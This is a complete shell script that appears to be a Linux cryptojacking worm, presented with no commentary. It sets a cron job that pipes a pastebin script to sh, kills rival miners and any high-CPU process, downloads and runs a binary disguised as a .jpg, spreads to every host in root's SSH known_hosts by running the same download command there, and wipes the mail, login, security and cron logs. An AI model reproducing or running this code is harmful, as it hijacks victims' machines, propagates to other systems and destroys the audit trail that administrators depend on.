export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin

echo "*/10 * * * * (curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh" | crontab -

ps auxf | grep -v grep | grep hwlh3wlh44lh | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep Circle_MI | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep get.bi-chi.com | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep hashvault.pro | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep nanopool.org | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep /usr/bin/.sshd | awk '{print $2}' | xargs kill -9
ps auxf | grep -v grep | grep /usr/bin/bsd-port | awk '{print $2}' | xargs kill -9
ps auxf|grep -v grep|grep "xmr" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xig" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "wnTKYg" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "sustes" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "thisxxs" | awk '{print $2}' | xargs kill -9
ps auxf|grep -v grep|grep "hashfish" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "kworkerds" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "watchdogs" | awk '{print $2}'|xargs kill -9
rm -rf /tmp/busybox
p=$(ps auxf|grep -v grep|grep ksoftirqds|wc -l)
if [ ${p} -eq 0 ];then
    ps auxf|grep -v grep | awk '{if($3>=50.0) print $2}'| xargs kill -9
fi
if [ -e "/tmp/gates.lod" ]; then
    rm -rf $(readlink /proc/$(cat /tmp/gates.lod)/exe)
    kill -9 $(cat /tmp/gates.lod)
    rm -rf $(readlink /proc/$(cat /tmp/moni.lod)/exe)
    kill -9 $(cat /tmp/moni.lod)
    rm -rf /tmp/{gates,moni}.lod
fi

if [ ! -f "/tmp/.lsdpid" ]; then
    ARCH=$(uname -m)
    if [ ${ARCH}x = "x86_64x" ]; then
        (curl -fsSL http://thyrsi.com/t6/675/1551444050x2918527038.jpg -o /tmp/kthrotlds||wget -q http://thyrsi.com/t6/675/1551444050x2918527038.jpg -O /tmp/kthrotlds) && chmod +x /tmp/kthrotlds
    elif [ ${ARCH}x = "i686x" ]; then
        (curl -fsSL http://thyrsi.com/t6/675/1551444102x2918527038.jpg -o /tmp/kthrotlds||wget -q http://thyrsi.com/t6/675/1551444102x2918527038.jpg -O /tmp/kthrotlds) && chmod +x /tmp/kthrotlds
    else
        (curl -fsSL http://thyrsi.com/t6/675/1551444102x2918527038.jpg -o /tmp/kthrotlds||wget -q http://thyrsi.com/t6/675/1551444102x2918527038.jpg -O /tmp/kthrotlds) && chmod +x /tmp/kthrotlds
    fi
        nohup /tmp/kthrotlds >/dev/null 2>&1 &
elif [ ! -f "/proc/$(cat /tmp/.lsdpid)/stat" ]; then
    ARCH=$(uname -m)
    if [ ${ARCH}x = "x86_64x" ]; then
        (curl -fsSL http://thyrsi.com/t6/675/1551444050x2918527038.jpg -o /tmp/kthrotlds||wget -q http://thyrsi.com/t6/675/1551444050x2918527038.jpg -O /tmp/kthrotlds) && chmod +x /tmp/kthrotlds
    elif [ ${ARCH}x = "i686x" ]; then
        (curl -fsSL http://thyrsi.com/t6/675/1551444102x2918527038.jpg -o /tmp/kthrotlds||wget -q http://thyrsi.com/t6/675/1551444102x2918527038.jpg -O /tmp/kthrotlds) && chmod +x /tmp/kthrotlds
    else
        (curl -fsSL http://thyrsi.com/t6/675/1551444102x2918527038.jpg -o /tmp/kthrotlds||wget -q http://thyrsi.com/t6/675/1551444102x2918527038.jpg -O /tmp/kthrotlds) && chmod +x /tmp/kthrotlds
    fi
        nohup /tmp/kthrotlds >/dev/null 2>&1 &
fi

if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://pastebin.com/raw/yPRSa0ki||wget -q -O- https://pastebin.com/raw/yPRSa0ki)|sh >/dev/null 2>&1 &' & done
fi

echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
#
#
